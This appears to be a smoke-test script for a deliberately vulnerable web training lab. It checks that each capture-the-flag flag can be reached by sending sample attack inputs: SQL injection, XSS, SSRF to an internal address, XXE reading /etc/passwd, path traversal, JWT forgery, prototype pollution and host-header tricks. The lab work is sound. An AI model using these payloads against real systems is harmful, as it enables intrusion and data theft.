from target_lab import FLAGS, app


def run():
    client = app.test_client()

    assert FLAGS["recon-basics"].encode() in client.get("/").data
    assert FLAGS["subdomain-takeover-sim"].encode() in client.get("/recon-lab?record=staging-old").data

    login = client.post("/login-lab", data={"username": "admin", "password": "' OR '1'='1"})
    assert FLAGS["web-auth-bypass"].encode() in login.data

    idor = client.get("/api-lab/doc/9001?user=guest").get_json()
    assert idor["flag"] == FLAGS["idor-training"]

    xss = client.get("/xss-lab?payload=<script>steal()</script>")
    assert FLAGS["xss-context"].encode() in xss.data

    ssrf = client.get("/ssrf-lab?url=http://127.0.0.1:5001/internal/metadata").get_json()
    assert ssrf["metadata"] == FLAGS["ssrf-internal"]

    redir = client.get("/redirect-lab/final")
    assert FLAGS["open-redirect-chain"].encode() in redir.data

    payload = "eyJyb2xlIjoiYWRtaW4ifQ"  # {"role":"admin"}
    jwt_resp = client.get(f"/jwt-lab?token=aaa.{payload}.bbb").get_json()
    assert jwt_resp["flag"] == FLAGS["jwt-none-alg"]

    for _ in range(6):
        rl = client.get("/rate-lab", headers={"X-Forwarded-For": "9.9.9.9"})
    assert FLAGS["rate-limit-bypass"] == rl.get_json()["flag"]

    cors = client.get("/cors-lab", headers={"Origin": "http://evil.local"}).get_json()
    assert cors["private_flag"] == FLAGS["cors-misconfig"]

    ssti = client.get("/ssti-lab?name={{flag}}")
    assert FLAGS["ssti-jinja"].encode() in ssti.data

    csrf = client.get("/csrf-lab?action=change_email")
    assert FLAGS["csrf-state-change"].encode() in csrf.data

    sqli = client.get("/sqli-lab?q=' OR '1'='1")
    assert FLAGS["blind-sqli-lab"].encode() in sqli.data

    xxe_body = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><a>&xxe;</a>"
    xxe = client.post("/xxe-lab", data=xxe_body).get_json()
    assert xxe["flag"] == FLAGS["xxe-parser-lab"]

    files = client.get("/files-lab?file=../../secret.txt")
    assert FLAGS["path-traversal-static"].encode() in files.data

    gql = client.post("/graphql-lab", json={"query": "{ hiddenFlag }"}).get_json()
    assert gql["data"]["hiddenFlag"] == FLAGS["graph-ql-introspection"]

    ws = client.get("/ws-lab?channel=admin").get_json()
    assert ws["flag"] == FLAGS["websocket-authz"]

    race = client.get("/race-lab?tries=2").get_json()
    assert race["flag"] == FLAGS["race-condition-wallet"]

    host = client.get("/host-lab", headers={"Host": "attacker.local:5001"})
    assert FLAGS["host-header-poisoning"].encode() in host.data

    oauth = client.get("/oauth-lab/callback?redirect_uri=http://evil.local/cb&code=ok")
    assert FLAGS["oauth-misconfig-lab"].encode() in oauth.data

    smuggle = client.get(
        "/smuggle-lab",
        headers={"X-Transfer-Encoding": "chunked", "X-Content-Length": "5"},
    ).get_json()
    assert smuggle["flag"] == FLAGS["request-smuggling-sim"]

    client.get("/cache-lab?poison=1")
    cache = client.get("/cache-lab")
    assert FLAGS["cache-poisoning-lab"].encode() in cache.data

    proto = client.post("/proto-lab", json={"__proto__": {"isAdmin": True}}).get_json()
    assert proto["flag"] == FLAGS["prototype-pollution-sim"]

    ci = client.get("/ci-lab/logs")
    assert FLAGS["ci-token-leak"].encode() in ci.data

    print("Target lab smoke test passed: all bounty flags reachable.")


if __name__ == "__main__":
    run()
